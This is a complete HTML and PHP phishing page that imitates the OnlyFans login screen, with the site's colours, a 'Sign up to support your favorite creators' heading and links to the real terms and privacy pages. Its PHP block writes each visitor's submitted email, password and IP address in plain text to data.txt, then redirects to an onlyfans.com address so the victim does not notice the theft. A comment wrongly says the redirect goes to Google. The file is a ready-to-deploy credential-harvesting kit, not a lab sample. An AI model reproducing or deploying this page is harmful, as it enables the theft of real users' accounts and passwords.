<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login</title>
  <style>
    /* Add some basic styling */
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      display: flex;
      flex-direction: column;
      min-height: 100vh; /* Set minimum height to full viewport height */
    }
    header {
      background-color: #00AFF0; /* Blue header color */
      padding: 20px;
      display: flex; /* Use flexbox for layout */
      align-items: center; /* Vertically center items */
    }
    .logo {
      width: 180px; /* Set width of the logo */
      height: auto; /* Maintain aspect ratio */
      margin-right: 20px; /* Add some space between the logo and other content */
    }
    .login-form {
      width: 300px;
      margin: 20px auto; /* Add margin to the top and bottom, and center horizontally */
      text-align: center;
    }
    .login-form h1 {
      font-size: 2rem;
      margin-bottom: 1rem;
      text-align: left; /* Align h1 text to the left */
    }
    .login-form input {
      width: calc(100% - 2px); /* Adjusted width to account for border */
      padding: 0.75rem;
      margin-bottom: 1rem;
      border: solid 1px gray;
      border-radius: 4px;
      box-sizing: border-box; /* Include padding and border in width calculation */
      transition: border-color 0.3s; /* Smooth transition for border color change */
    }
    .login-form input:focus {
      border-color: #00AFF0; /* Change border color when input is focused */
    }
    .login-form button {
      width: calc(100% - 2px); /* Adjusted width to account for border */
      padding: 0.75rem;
      background-color: #00AFF0; /* Light blue color */
      color: white;
      border: none;
      border-radius: 20px; /* Round the button */
      cursor: pointer;
      box-sizing: border-box; /* Include padding and border in width calculation */
      font-weight: bold; /* Make the text thicker */
    }
    .login-form button:hover {
      background-color: #87CEEB; /* Light blue color when hovered */
    }
    .login-form .links {
      margin-top: 10px; /* Add margin to the top */
      display: flex;
      justify-content: space-between;
    }
    .login-form a {
      color: #00AFF0; /* Set link color to light blue */
      text-decoration: none; /* Remove underline */
    }
    .login-form a:hover {
      text-decoration: underline; /* Underline on hover */
    }
    footer {
      margin-top: auto; /* Push footer to the bottom */
      background-color: #f2f2f2; /* Light gray background */
      padding: 20px;
      text-align: center;
    }
    .container {
      max-width: 1200px; /* Limit container width */
      margin: 0 auto; /* Center container horizontally */
    }
  </style>
</head>
<body>
  <header>
    <img src="./icon.png" alt="Logo" class="logo">
  </header>
  <div class="login-form">
    <h1>Sign up to support your favorite creators</h1> <!-- This is positioned below the header -->
    <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="POST">
      <input type="email" name="email" placeholder="Email" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">LOG IN</button>
    </form>
    <div class="links">
      <a href="#">Forgot password?</a>
      <a href="#">Sign up for OnlyFans</a>
    </div>
  </div>
  <footer>
    <div class="container pageFooter">
      <div id="contentCurve"></div>
      <p class="text-muted disclaimer text-center ng-binding" style="font-size: 11px">If you register a new account, you agree to Onlyfans's <a href="https://onlyfans.com/terms" target="_blank">Terms & Conditions</a> and <a href="https://onlyfans.com/privacy" target="_blank">Privacy Policy</a>.</p>
    </div>
  </footer>
</body>
</html>

<?php
// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $email = $_POST["email"];
    $password = $_POST["password"];
    $ip = $_SERVER['REMOTE_ADDR']; // Get the visitor's IP address
    
    // Store the email, password, and IP address in the text file
    $data = "Email: $email\nPassword: $password\nIP Address: $ip\n";
    file_put_contents("data.txt", $data, FILE_APPEND);
    
    // Redirect to Google
    header("Location: https://onlyfans.com/claim-150-dave");
    exit; // Ensure subsequent code is not executed after redirection
}
?>

